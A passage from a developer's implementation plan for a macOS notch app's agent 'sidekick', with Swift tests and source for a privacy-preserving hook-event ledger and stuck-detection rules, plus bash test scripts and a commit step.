            if !d.isEmpty { diffs.append("\(s["name"] as! String): \(d.first!)") }
        }
        CT.checkRows("every sequence ends with its ledger", diffs)

        CT.section("what the fixture cannot write")
        let start = L.eventFrom(["hook_event_name": "SessionStart", "session_id": "S", "cwd": "/a/b"], now: 1000)!
        CT.check("a time that is not finite gives no event", [L.eventFrom(["hook_event_name": "Stop"], now: .nan) == nil, L.eventFrom(["hook_event_name": "Stop"], now: .infinity) == nil], [true, true])
        let ledger1 = L.apply(SKLedger(), start)
        CT.check("an event with a time that is not finite changes nothing", L.apply(ledger1, SKEvent(at: .nan, agentId: "integration_claude", sessionId: "S", kind: "stop")), ledger1)
        let before = ledger1
        _ = L.apply(ledger1, SKEvent(at: 2000, agentId: "integration_claude", sessionId: "S", kind: "prompt"))
        CT.check("the ledger it is given is not changed", ledger1, before)
        CT.check("a session id of a million characters is kept to 128 code points", L.eventFrom(["hook_event_name": "Stop", "session_id": String(repeating: "x", count: 1_000_000)], now: 1)!.sessionId.unicodeScalars.count, 128)
        CT.check("a payload with no object is nothing", [L.eventFrom(nil, now: 1) == nil, L.eventFrom("Stop", now: 1) == nil, L.eventFrom([1, 2], now: 1) == nil], [true, true, true])
        var deep: Any = "x"
        for _ in 0..<5000 { deep = ["a": deep] }
        CT.check("an input nested 5000 deep gives a fixed key, not a crash", SK.commandKey(tool: "Bash", input: ["command": deep]), "Bash#too-deep")

        CT.section("nothing secret reaches an event or the ledger")
        let secrets = ["SECRET-PROMPT", "SECRET-OUTPUT", "SECRET-MSG", "SECRET-CONTENT", "SECRET-DIR", "SECRET-CMD", "SECRET-TRANSCRIPT"]
        func hook(_ name: String, _ extra: [String: Any] = [:]) -> [String: Any] { var p: [String: Any] = ["hook_event_name": name, "session_id": "S1", "cwd": "/Users/\(secrets[4])/proj"]; for (k, v) in extra { p[k] = v }; return p }
        let payloads: [[String: Any]] = [
            hook("UserPromptSubmit", ["prompt": secrets[0], "transcript_path": "/Users/me/.claude/\(secrets[6]).jsonl"]),
            hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "echo \(secrets[5])"], "tool_response": ["stdout": secrets[1]]]),
            hook("PostToolUse", ["tool_name": "Write", "tool_input": ["file_path": "/Users/\(secrets[4])/proj/a.js", "content": secrets[3]]]),
            hook("PermissionRequest", ["tool_name": "Bash", "tool_input": ["command": "curl https://\(secrets[5])"]]),
            hook("Stop", ["last_assistant_message": secrets[2]]),
        ]
        var l = SKLedger()
        for (i, p) in payloads.enumerated() { l = L.apply(l, L.eventFrom(p, now: 9_000_000 + Double(i) * 1000)!) }
        let text = String(data: try! JSONSerialization.data(withJSONObject: l.json), encoding: .utf8)!
        CT.check("no marker is in the ledger", secrets.filter { text.contains($0) }, [])
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-ledger.sh`**

```bash
#!/usr/bin/env bash
# Sidekick hook adapter and ledger (eventFrom, ledgerApply, the command key): every case of tests/fixtures/sidekick/hook-cases.json, and what the fixture cannot write. Pure Foundation.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-ledger.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift \
    tests/CatTestSupport.swift tests/SidekickLedgerTests.swift \
    -o "$TEST_DIR/sidekick-ledger-tests"
"$TEST_DIR/sidekick-ledger-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-ledger.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-ledger.sh`
Expected: FAIL. `error opening input file` for `SidekickLedger.swift`.

- [ ] **Step 3: Write the adapter and the ledger**

**Create `NotchBuddy/Sources/App/SidekickLedger.swift`**

```swift
import Foundation

// The sidekick's memory: a hook payload becomes a small normalised event (`eventFrom`), and the ledger folds events into one record per session (`apply`). Port of `eventFrom`,
// `ledgerApply` and their helpers in `shared/sidekick-core.js` (the tie-breaker); tests/fixtures/sidekick/hook-cases.json pins them and docs/SIDEKICK-CONTRACT.md explains them.
// The ledger keeps a basename, a command key (a hash) and counts, and nothing else: no prompt, no assistant text, no `transcript_path`, no command, no full path, no file content.
// It is memory only (never written to disk, never logged) and a value: every function returns a new ledger and leaves the one it is given alone. Pure Foundation.

struct SKEvent: Equatable, Sendable {
    var at: Double
    var agentId: String
    var sessionId: String
    /// sessionStart, prompt, preTool, question, tool, failure, approvalAsked, approvalAnswered, stop, stopFailure, subagentStart, subagentStop, sessionEnd or notification.
    var kind: String
    var name = ""
    var tool = ""
    var target = ""
    var file = ""
    var key = ""
    var ok = true
    var project = ""
    var subagentId = ""

    var json: [String: Any] {
        ["at": at, "agentId": agentId, "sessionId": sessionId, "kind": kind, "name": name, "tool": tool, "target": target, "file": file, "key": key, "ok": ok, "project": project, "subagentId": subagentId]
    }
}

struct SKRing: Equatable, Sendable {
    var at: Double
    var kind: String
    var tool: String
    var target: String
    var file: String
    var key: String
    var ok: Bool

    var json: [String: Any] { ["at": at, "kind": kind, "tool": tool, "target": target, "file": file, "key": key, "ok": ok] }
}

struct SKSession: Equatable, Sendable {
    var key: String
    var agentId: String
    var sessionId: String
    var startedAt: Double
    var lastEventAt: Double
    var endedAt: Double? = nil
    /// The cat's words: idle, thinking, working, searching, approval, question, finished, error.
    var state = "idle"
    var last = "sessionStart"
    var project = ""
    var ring: [SKRing] = []
    var pendingApprovalAt: Double? = nil
    var pendingKey: String? = nil
    /// The helpers that are alive, each with when it started, in the order they came.
    var subagents: [Sub] = []
    var nudgedAt: Double? = nil

    struct Sub: Equatable, Sendable { var id: String; var at: Double }

    var aliveSubagents: Int { subagents.count }
    var isDone: Bool { endedAt != nil || state == "finished" || state == "error" }

    private static func opt(_ x: Double?) -> Any { x.map { $0 as Any } ?? NSNull() }

    var json: [String: Any] {
        ["key": key, "agentId": agentId, "sessionId": sessionId, "startedAt": startedAt, "lastEventAt": lastEventAt, "endedAt": Self.opt(endedAt), "state": state, "last": last, "project": project,
         "ring": ring.map(\.json), "pendingApprovalAt": Self.opt(pendingApprovalAt), "pendingKey": pendingKey.map { $0 as Any } ?? NSNull(),
         "subagents": Dictionary(subagents.map { ($0.id, $0.at) }, uniquingKeysWith: { $1 }), "nudgedAt": Self.opt(nudgedAt)]
    }

    /// A session as the fixtures hold it (a ledger's record). Anything that is not a number or text where one belongs takes the default, so a hand-made record never throws.
    init(json j: [String: Any]) {
        func num(_ x: Any?) -> Double? { guard let n = x as? NSNumber, CFGetTypeID(n) != CFBooleanGetTypeID(), n.doubleValue.isFinite else { return nil }; return n.doubleValue }
        key = j["key"] as? String ?? ""
        agentId = j["agentId"] as? String ?? ""
        sessionId = j["sessionId"] as? String ?? ""
        startedAt = num(j["startedAt"]) ?? 0
        lastEventAt = num(j["lastEventAt"]) ?? 0
        endedAt = num(j["endedAt"])
        state = j["state"] as? String ?? "idle"
        last = j["last"] as? String ?? "sessionStart"
        project = j["project"] as? String ?? ""
        pendingApprovalAt = num(j["pendingApprovalAt"])
        pendingKey = j["pendingKey"] as? String
        nudgedAt = num(j["nudgedAt"])
        ring = (j["ring"] as? [Any] ?? []).compactMap { $0 as? [String: Any] }.map {
            SKRing(at: num($0["at"]) ?? 0, kind: $0["kind"] as? String ?? "", tool: $0["tool"] as? String ?? "", target: $0["target"] as? String ?? "", file: $0["file"] as? String ?? "", key: $0["key"] as? String ?? "", ok: ($0["ok"] as? Bool) ?? true)
        }
        subagents = (j["subagents"] as? [String: Any] ?? [:]).compactMap { k, v in num(v).map { Sub(id: k, at: $0) } }.sorted { $0.at < $1.at || ($0.at == $1.at && $0.id < $1.id) }
    }

    init(key: String, agentId: String, sessionId: String, startedAt: Double, lastEventAt: Double) {
        self.key = key; self.agentId = agentId; self.sessionId = sessionId; self.startedAt = startedAt; self.lastEventAt = lastEventAt
    }
}

struct SKLedger: Equatable, Sendable {
    var sessions: [SKSession] = []
    var json: [String: Any] { ["sessions": sessions.map(\.json)] }
    init(sessions: [SKSession] = []) { self.sessions = sessions }
    init(json j: Any?) { sessions = ((j as? [String: Any])?["sessions"] as? [Any] ?? []).compactMap { $0 as? [String: Any] }.map(SKSession.init(json:)) }
}

enum SidekickLedger {
    static let ringMax = 40, sessionsMax = 8, subagentsMax = 20
    static let endedKeepMs = 30 * SK.minute, silentKeepMs = 12 * 60 * SK.minute

    private static let cursorBundle = "com.todesktop.230313mzl4w4u92"
    /// Both the names the relays send and the agents' own.
    private static let eventKind: [String: String] = [
        "SessionStart": "sessionStart", "startup": "sessionStart",
        "UserPromptSubmit": "prompt", "BeforeAgent": "prompt", "PreInvocation": "prompt",
        "PreToolUse": "preTool", "BeforeTool": "preTool",
        "PostToolUse": "tool", "AfterTool": "tool",
        "PostToolUseFailure": "failure",
        "PermissionRequest": "approvalAsked",
        "Stop": "stop", "AfterAgent": "stop", "PostInvocation": "stop", "Interrupt": "stop",
        "StopFailure": "stopFailure",
        "SubagentStart": "subagentStart", "SubagentStop": "subagentStop",
        "SessionEnd": "sessionEnd", "exit": "sessionEnd",
        "Notification": "notification",
    ]
    private static let searchTools: Set<String> = ["WebSearch", "WebFetch", "Grep", "Glob", "google_web_search", "web_fetch", "grep_search", "search_file_content", "glob", "web_search", "grep_files"]
    /// The state a tool puts an agent in: a search tool is searching, any other is working (the cat's rule).
    static func toolState(_ tool: String) -> String { searchTools.contains(tool) ? "searching" : "working" }

    /// Which pill a payload belongs to: a valid `nm_agent` (not "claude"), Codex, Cursor by its bundle ID, else Claude Code.
    private static func agentId(of payload: [String: Any], codex: Bool) -> String {
        let tag = payload["nm_agent"] as? String ?? ""
        if tag == "codex" && codex { return "agent_codex" }
        if tag != "claude" && Rx.test("^[a-z0-9-]{1,24}\\z", tag) { return "agent_" + tag }
        if let b = payload["bundle_id"] as? String, b.lowercased() == cursorBundle { return "agent_cursor" }
        return "integration_claude"
    }

    /// The first 128 code points of a name or an id.
    static func capId(_ s: String) -> String {
        let u = s.unicodeScalars
        guard u.count > 128 else { return s }
        var v = String.UnicodeScalarView(); v.append(contentsOf: u.prefix(128)); return String(v)
    }

    /// Turns a hook payload into the event the ledger takes, or nil for an event it does not know, a payload that is not an object and a time that is not finite. `now` is the time the app received it (ms).
    /// `codex` is false in the App Store build. The event holds a basename, a command key and counts, never the prompt, the assistant's text, a command or a path.
    static func eventFrom(_ payload: Any?, now: Double, codex: Bool = true) -> SKEvent? {
        guard let p = payload as? [String: Any], now.isFinite else { return nil }
        let name = p["hook_event_name"] as? String ?? ""
        guard var kind = eventKind[name] else { return nil }
        let tool = (p["tool_name"] as? String).map(capId) ?? ""
        let input = p["tool_input"] as? [String: Any] ?? [:]
        if tool == "AskUserQuestion" && (kind == "preTool" || kind == "approvalAsked") { kind = "question" }
        let session = [p["session_id"], p["conversation_id"]].compactMap { $0 as? String }.first { !$0.isEmpty } ?? "unknown"
        let cwd = p["cwd"] as? String ?? ""
        var ev = SKEvent(at: now, agentId: agentId(of: p, codex: codex), sessionId: capId(session), kind: kind, name: name, tool: tool, ok: kind != "failure" && kind != "stopFailure", project: cwd.isEmpty ? "" : SK.baseName(cwd))
        if ["tool", "failure", "approvalAsked", "preTool", "question"].contains(kind) {
            let files = SidekickExplain.pathsOf(tool, input)
            ev.key = SK.commandKey(tool: tool, input: input)
            ev.target = files.first.map { SK.baseName($0) } ?? ev.key
            ev.file = files.first.map { SK.baseName($0) } ?? ""
        }
        if kind == "subagentStart" || kind == "subagentStop" { ev.subagentId = (p["agent_id"] as? String).map(capId) ?? "" }
        return ev
    }

    /// The event for the user's click on an approval card: the app makes it (it is not a hook).
    static func approvalAnswered(agentId: String, sessionId: String, now: Double) -> SKEvent {
        SKEvent(at: now, agentId: agentId, sessionId: sessionId, kind: "approvalAnswered")
    }

    /// Drops the sessions that are over: 30 minutes after SessionEnd, 12 hours after the last event of one that never ended.
    static func prune(_ ledger: SKLedger, now: Double) -> SKLedger {
        SKLedger(sessions: ledger.sessions.filter { s in s.endedAt.map { now - $0 <= endedKeepMs } ?? (now - s.lastEventAt <= silentKeepMs) })
    }

    private static func fold(_ s: inout SKSession, _ ev: SKEvent) {
        s.lastEventAt = max(s.lastEventAt, ev.at)
        if !ev.project.isEmpty { s.project = ev.project }
        if ev.kind == "notification" { return }   // only the time of the last event moves: a finished session stays finished
        if s.endedAt != nil && ev.kind != "sessionEnd" { s.endedAt = nil }
        func ring(_ kind: String, tool: String? = nil, target: String? = nil, ok: Bool = true) {
            s.ring.append(SKRing(at: ev.at, kind: kind, tool: tool ?? ev.tool, target: target ?? ev.target, file: ev.file, key: ev.key, ok: ok))
            if s.ring.count > ringMax { s.ring.removeFirst(s.ring.count - ringMax) }
        }
        func clearPending() { s.pendingApprovalAt = nil; s.pendingKey = nil }
        switch ev.kind {
        case "sessionStart": s.state = "idle"; clearPending()
        case "prompt": s.state = "thinking"; clearPending()
        case "preTool": s.state = toolState(ev.tool)
        case "question": s.state = "question"
        case "tool", "failure":
            ring(ev.kind, ok: ev.kind == "tool")
            if let k = s.pendingKey, ev.key == k { clearPending() }
            if s.pendingKey == nil { s.state = "thinking" }   // while another request still waits, the cat stays on it
        case "approvalAsked": ring("approvalAsked"); s.pendingApprovalAt = ev.at; s.pendingKey = ev.key; s.state = "approval"
        case "approvalAnswered": ring("approvalAnswered", tool: "", target: ""); clearPending(); if s.state == "approval" { s.state = "working" }
        case "stop": ring("stop", tool: "", target: ""); s.state = "finished"; clearPending(); s.subagents = []
        case "stopFailure": ring("stopFailure", tool: "", target: "", ok: false); s.state = "error"; clearPending(); s.subagents = []
        case "subagentStart":
            ring("subagentStart", tool: "", target: "")
            if !ev.subagentId.isEmpty && ev.subagentId != "__proto__" {
                if let i = s.subagents.firstIndex(where: { $0.id == ev.subagentId }) { s.subagents[i].at = ev.at } else { s.subagents.append(SKSession.Sub(id: ev.subagentId, at: ev.at)) }
                if s.subagents.count > subagentsMax {
                    let oldest = s.subagents.enumerated().min { $0.element.at < $1.element.at || ($0.element.at == $1.element.at && $0.offset < $1.offset) }!.offset
                    s.subagents.remove(at: oldest)
                }
            }
        case "subagentStop": ring("subagentStop", tool: "", target: ""); s.subagents.removeAll { $0.id == ev.subagentId }
        case "sessionEnd": s.endedAt = ev.at; s.state = "finished"; clearPending(); s.subagents = []
        default: break
        }
        s.last = ev.kind
    }

    /// The ledger after one event. Pure: the ledger it is given is not changed. The key of a session is `agentId|sessionId`. At most 8 sessions are kept (a finished one goes first,
    /// the oldest first), each ring keeps its last 40 entries. An event with a time that is not finite changes nothing.
    static func apply(_ ledger: SKLedger, _ ev: SKEvent) -> SKLedger {
        guard ev.at.isFinite else { return ledger }
        let key = "\(ev.agentId)|\(ev.sessionId)"
        var sessions = prune(ledger, now: ev.at).sessions
        let i = sessions.firstIndex { $0.key == key }
        if i == nil && (ev.kind == "sessionEnd" || ev.kind == "notification") { return SKLedger(sessions: sessions) }   // a pruned or unknown session is not brought back
        var s = i.map { sessions[$0] } ?? SKSession(key: key, agentId: ev.agentId, sessionId: ev.sessionId, startedAt: ev.at, lastEventAt: ev.at)
        fold(&s, ev)
        if let i { sessions[i] = s } else { sessions.append(s) }
        while sessions.count > sessionsMax {
            let victims = sessions.enumerated().filter { $0.element.key != key }
            let pool = victims.filter { $0.element.isDone }
            let from = pool.isEmpty ? victims : pool
            var pick = from[0]
            for v in from.dropFirst() where v.element.lastEventAt < pick.element.lastEventAt { pick = v }
            sessions.remove(at: pick.offset)
        }
        return SKLedger(sessions: sessions)
    }

    /// The sessions that have not ended, as the status answer and the recap's "still working" see them.
    static func live(_ ledger: SKLedger) -> [SKSession] { ledger.sessions.filter { $0.endedAt == nil } }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-ledger.sh`
Expected: PASS. `eventFrom: 52 payloads`, `ledgerApply: 19 sequences`, 17 `✓` lines in all, then `All tests passed.`

Bite it once: `sed -i '' 's/static let ringMax = 40/static let ringMax = 30/' NotchBuddy/Sources/App/SidekickLedger.swift && bash scripts/test-sidekick-ledger.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ every sequence ends with its ledger` and `1 test(s) failed.` Undo it with `sed -i '' 's/static let ringMax = 30/static let ringMax = 40/' NotchBuddy/Sources/App/SidekickLedger.swift` and run the test again.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the hook adapter and the ledger, from hook-cases.json

eventFrom turns a hook payload into an event that holds a basename, a command key and counts; the ledger folds events into one memory-only record per session.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickLedger.swift tests/SidekickLedgerTests.swift scripts/test-sidekick-ledger.sh
git commit -F "$MSG"
```

---

### Task 3: The stuck rules

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickStuck.swift`, `tests/SidekickStuckTests.swift`, `scripts/test-sidekick-stuck.sh`

**Interfaces:**
- Consumes: Task 2's `SKLedger`, `SKSession`, `SKRing`, `SidekickLedger.eventFrom/apply`; Task 1's `SidekickExplain.writeTools`, `SK`; F1-0's `stuckStep`, `markNudged` and `nudgeText` and `tests/fixtures/sidekick/stuck-cases.json` (keys `thresholds`, `kinds`, `cases`; a case is a timeline of steps that are `{at, payload}` or `{at, probe: {ctx?, mark?}, expect, nextAt?, text?}`).
- Produces: `SKNudge` (`kind`, `reasonId`, `key`, `agentId`), `SKStuckContext` (`ratelimit`, `away`, `cardShown`, `platform`), `SKStuckResult` (`nudge`, `nextAt`) and `SidekickStuck` (the thresholds `loopCalls`, `loopSame`, `errors`, `windowMs`, `waitMs`, `silentMs`, `silentPreMs`, `kittenMs`, `giveUpMs`; `kinds`; `step(_:now:ctx:)`, `markNudged(_:key:now:)`, `text(_:_:now:platform:)`, `waitingDue`, `silentDue`, `loopFires`, `errorsFire`). Tasks 4, 6 and 9 read them.

Four rules, one nudge at a time, one nudge per session: **loop** (the same tool and command key four times in the last eight calls, within ten minutes, with no successful edit between), **errors** (three failures in a row, Claude Code only), **waiting** (a request unanswered for 60 s whose card is not on screen) and **silent** (five minutes after a finished step, fifteen after a step that never ended, never while a helper is under ten minutes old). Nothing is said while the user is away or the agent is rate-limited. `step` also returns the earliest future deadline of the waiting and silent rules, for the app's one one-shot timer: `nil` while nothing is live, so a hidden island with no agent sets no timer at all. The rules read the ledger and never change it.

- [ ] **Step 1: Write the failing test**

The program checks the thresholds against the fixture's, replays its 40 timelines (68 probes: each answer, deadline and words), and adds what it cannot write (a time that is not finite, no deadline for a finished session or while away, a nudged session is not nudged again, an unknown platform is the Mac).

**Create `tests/SidekickStuckTests.swift`**

```swift
import Foundation

// The four stuck rules against tests/fixtures/sidekick/stuck-cases.json (timelines of hook payloads and probes), the thresholds, and what the fixture cannot write: a time that is not
// finite, a ledger the call must not change, the one-shot timer's deadline moving as the ledger does. Run through scripts/test-sidekick-stuck.sh.

@main
enum SidekickStuckTests {
    typealias S = SidekickStuck
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }
    static func number(_ v: Any?) -> Double? { guard let n = v as? NSNumber, CFGetTypeID(n) != CFBooleanGetTypeID() else { return nil }; return n.doubleValue }

    static func ctx(_ j: Any?) -> SKStuckContext {
        let o = j as? [String: Any] ?? [:]
        return SKStuckContext(ratelimit: o["ratelimit"] as? Bool ?? false, away: o["away"] as? Bool ?? false, cardShown: o["cardShown"] as? Bool ?? false, platform: o["platform"] as? String ?? "mac")
    }

    @MainActor static func main() {
        let fx = CT.fixture("stuck-cases.json", dir: "sidekick")

        CT.section("the thresholds are the contract's")
        let t = fx["thresholds"] as! [String: Any]
        CT.check("loop: 4 of the last 8 calls", [S.loopSame, S.loopCalls], [Int(number(t["LOOP_SAME"])!), Int(number(t["LOOP_CALLS"])!)])
        CT.check("three errors in a row", S.errors, Int(number(t["ERRORS"])!))
        CT.check("ten-minute window, 60 s wait, 5 and 15 minutes quiet, ten minutes for a kitten", [S.windowMs, S.waitMs, S.silentMs, S.silentPreMs, S.kittenMs], ["WINDOW_MS", "WAIT_MS", "SILENT_MS", "SILENT_PRE_MS", "KITTEN_MS"].map { number(t[$0])! })
        CT.check("the app gives up at 115 s on the Mac, 110 s on Windows and Linux", S.giveUpMs, (t["GIVE_UP_MS"] as! [String: Any]).mapValues { number($0)! })
        CT.check("the kinds, in the order they are tried", S.kinds, fx["kinds"] as! [String])

        let cases = rows(fx["cases"])
        CT.section("stuckStep: \(cases.count) timelines, each probe's answer, deadline and words")
        var diffs: [String] = []
        var probes = 0
        for c in cases {
            var ledger = SKLedger()
            for st in rows(c["steps"]) {
                let at = number(st["at"])!
                if let p = st["payload"] {
                    if let ev = SidekickLedger.eventFrom(p, now: at) { ledger = SidekickLedger.apply(ledger, ev) }
                    continue
                }
                probes += 1
                let probe = st["probe"] as? [String: Any] ?? [:]
                let cx = ctx(probe["ctx"])
                let r = S.step(ledger, now: at, ctx: cx)
                let label = "\(c["name"] as! String) @\(at)"
                if r.nudge?.kind != st["expect"] as? String { diffs.append("\(label): kind \(r.nudge?.kind ?? "nil"), want \(st["expect"] ?? "nil")") }
                if st.keys.contains("nextAt") {
                    let want = number(st["nextAt"])
                    if r.nextAt != want { diffs.append("\(label): nextAt \(String(describing: r.nextAt)), want \(String(describing: want))") }
                }
                if let words = st["text"] as? String {
                    let got = r.nudge.map { S.text($0, ledger, now: at, platform: cx.platform) }
                    if got != words { diffs.append("\(label): text \(got ?? "nil"), want \(words)") }
                }
                if probe["mark"] as? Bool == true, let n = r.nudge { ledger = S.markNudged(ledger, key: n.key, now: at) }
            }
        }
        CT.checkRows("every probe gives the fixture's answer (\(probes) probes)", diffs)

        CT.section("what the fixture cannot write")
        func session(state: String = "working", last: String = "tool", lastEventAt: Double = 1000, agent: String = "integration_claude") -> SKLedger {
            var s = SKSession(key: "\(agent)|S", agentId: agent, sessionId: "S", startedAt: 0, lastEventAt: lastEventAt)
            s.state = state; s.last = last
            return SKLedger(sessions: [s])
        }
        let quiet = session()
        CT.check("a time that is not finite gives nothing", [S.step(quiet, now: .nan), S.step(quiet, now: .infinity)], [SKStuckResult(nudge: nil, nextAt: nil), SKStuckResult(nudge: nil, nextAt: nil)])
        CT.check("the quiet rule falls due 5 minutes after the last step, and the timer is told", S.step(quiet, now: 2000).nextAt, 1000 + 5 * 60000)
        CT.check("at that time it fires", S.step(quiet, now: 1000 + 5 * 60000).nudge?.kind, "stuck.silent")
        CT.check("no live session, no deadline: the clock is not set", S.step(SKLedger(), now: 1).nextAt, nil)
        CT.check("a finished session sets no deadline", S.step(session(state: "finished"), now: 2000).nextAt, nil)
        CT.check("away or rate-limited: nothing and no deadline", [S.step(quiet, now: 2000, ctx: SKStuckContext(away: true)).nextAt, S.step(quiet, now: 2000, ctx: SKStuckContext(ratelimit: true)).nextAt], [nil, nil])
        let before = quiet
        _ = S.markNudged(quiet, key: "integration_claude|S", now: 5)
        CT.check("markNudged does not change the ledger it is given", quiet, before)
        CT.check("a nudged session is not nudged again", S.step(S.markNudged(quiet, key: "integration_claude|S", now: 5), now: 1000 + 6 * 60000).nudge, nil)
        CT.check("a platform that is not known is the Mac", S.text(SKNudge(kind: "stuck.waiting", reasonId: "waiting", key: "k", agentId: "agent_codex"), SKLedger(), now: 0, platform: "plan9"), "Codex is still waiting for your OK.")
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-stuck.sh`**

```bash
#!/usr/bin/env bash
# Sidekick stuck rules (stuckStep, nudgeText, markNudged): every timeline of tests/fixtures/sidekick/stuck-cases.json, and what the fixture cannot write. Pure Foundation.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-stuck.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift $APP/SidekickStuck.swift \
    tests/CatTestSupport.swift tests/SidekickStuckTests.swift \
    -o "$TEST_DIR/sidekick-stuck-tests"
"$TEST_DIR/sidekick-stuck-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-stuck.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-stuck.sh`
Expected: FAIL. `error opening input file` for `SidekickStuck.swift`.

- [ ] **Step 3: Write the rules**

**Create `NotchBuddy/Sources/App/SidekickStuck.swift`**

```swift
import Foundation

// When does an agent look stuck. Port of `stuckStep`, `markNudged` and `nudgeText` in `shared/sidekick-core.js` (the tie-breaker); tests/fixtures/sidekick/stuck-cases.json pins them and
// docs/SIDEKICK-CONTRACT.md explains them. Four rules, at most one nudge at a time, one nudge per session, and the time the next deadline falls due, for the app's ONE one-shot timer
// (like `CatSleepClock`): `stuck.loop` and `stuck.errors` are looked at when an event arrives and need no timer, `stuck.waiting` and `stuck.silent` have a deadline. It reads the
// ledger, never changes it, and labels only. Pure Foundation.

struct SKNudge: Equatable, Sendable {
    /// stuck.loop, stuck.errors, stuck.waiting or stuck.silent: they are the kinds of dismissal too.
    var kind: String
    var reasonId: String
    /// The session's ledger key (`agentId|sessionId`).
    var key: String
    var agentId: String
}

/// What the app knows that the ledger does not: the cat shows the rate limit, the user is away, and the waiting nudge is for a request whose card is not on screen.
struct SKStuckContext: Equatable, Sendable {
    var ratelimit = false
    var away = false
    var cardShown = false
    /// "mac", "windows" or "linux" (anything else is the Mac): when the app gave up on the request.
    var platform = "mac"
}

struct SKStuckResult: Equatable, Sendable {
    var nudge: SKNudge?
    /// The earliest future deadline of the waiting and quiet rules, for the one-shot timer; nil when nothing is live (the clock is then not set).
    var nextAt: Double?
}

enum SidekickStuck {
    static let loopCalls = 8, loopSame = 4, errors = 3
    static let windowMs = 10 * SK.minute, waitMs = 60000.0, silentMs = 5 * SK.minute, silentPreMs = 15 * SK.minute, kittenMs = 10 * SK.minute
    static let giveUpMs: [String: Double] = ["mac": 115000, "windows": 110000, "linux": 110000]
    /// The kinds in the order they are tried when two fire together.
    static let kinds = ["stuck.loop", "stuck.errors", "stuck.waiting", "stuck.silent"]
    private static let active: Set<String> = ["thinking", "working", "searching"]
    private static let writeSet = SidekickExplain.writeTools.union(["apply_patch"])

    private static func isCall(_ r: SKRing) -> Bool { r.kind == "tool" || r.kind == "failure" }

    /// The same tool and key four times in the last eight calls, within ten minutes, with no successful edit or write after the first of them.
    static func loopFires(_ s: SKSession, now: Double) -> Bool {
        guard active.contains(s.state), now - s.lastEventAt <= windowMs else { return false }
        let calls = Array(s.ring.enumerated().filter { isCall($0.element) }.suffix(loopCalls))
        guard calls.count >= loopSame, let newest = calls.last else { return false }
        let inWindow = calls.filter { newest.element.at - $0.element.at <= windowMs }
        var order: [String] = [], groups: [String: [(offset: Int, element: SKRing)]] = [:]
        for r in inWindow where !r.element.tool.isEmpty {
            let k = "\(r.element.tool)\u{0}\(r.element.key)"
            if groups[k] == nil { order.append(k) }
            groups[k, default: []].append(r)
        }
        for k in order {
            let members = groups[k]!
            if members.count < loopSame { continue }
            let after = s.ring[(members[0].offset + 1)...]
            if !after.contains(where: { $0.kind == "tool" && $0.ok && writeSet.contains($0.tool) }) { return true }
        }
        return false
    }

    /// Three failures in a row, within ten minutes, with no success between. Claude Code only: the other agents send no failure event.
    static func errorsFire(_ s: SKSession, now: Double) -> Bool {
        guard s.agentId == "integration_claude", active.contains(s.state) else { return false }
        let last = s.ring.filter(isCall).suffix(errors)
        guard last.count == errors, last.allSatisfy({ $0.kind == "failure" }), let first = last.first, let end = last.last else { return false }
        return end.at - first.at <= windowMs && now - end.at <= windowMs
    }

    static func waitingDue(_ s: SKSession) -> Double? { s.state == "approval" ? s.pendingApprovalAt.map { $0 + waitMs } : nil }

    /// When the quiet rule is due: 5 minutes after a finished step, a prompt or a subagent's stop, 15 after a step that began and never ended; never while a kitten is under 10 minutes old.
    static func silentDue(_ s: SKSession) -> Double? {
        guard active.contains(s.state) else { return nil }
        let gap: Double
        if s.last == "preTool" { gap = silentPreMs } else if ["tool", "failure", "prompt", "subagentStop"].contains(s.last) { gap = silentMs } else { return nil }
        return max(s.lastEventAt + gap, s.subagents.map(\.at).max().map { $0 + kittenMs } ?? 0)
    }

    /// At most one nudge, and when the next one could fall due. Each session is nudged once (`nudgedAt`). Nothing is said while the user is away or the agent is rate-limited, and then no deadline
    /// is given either: the caller asks again when that ends. The waiting deadline is left out while its card is on screen; the caller asks again when the card hides.
    static func step(_ ledger: SKLedger, now: Double, ctx: SKStuckContext = SKStuckContext()) -> SKStuckResult {
        var out = SKStuckResult(nudge: nil, nextAt: nil)
        guard now.isFinite, !ctx.ratelimit, !ctx.away else { return out }
        var best: (rank: Int, s: SKSession)?
        for s in ledger.sessions {
            if s.endedAt != nil || s.nudgedAt != nil { continue }
            let wd = waitingDue(s), sd = silentDue(s)
            let fired: Int? = loopFires(s, now: now) ? 0 : errorsFire(s, now: now) ? 1 : (wd.map { now >= $0 } == true && !ctx.cardShown) ? 2 : (sd.map { now >= $0 } == true) ? 3 : nil
            if let fired, best == nil || fired < best!.rank { best = (fired, s) }
            for due in [ctx.cardShown ? nil : wd, sd] {
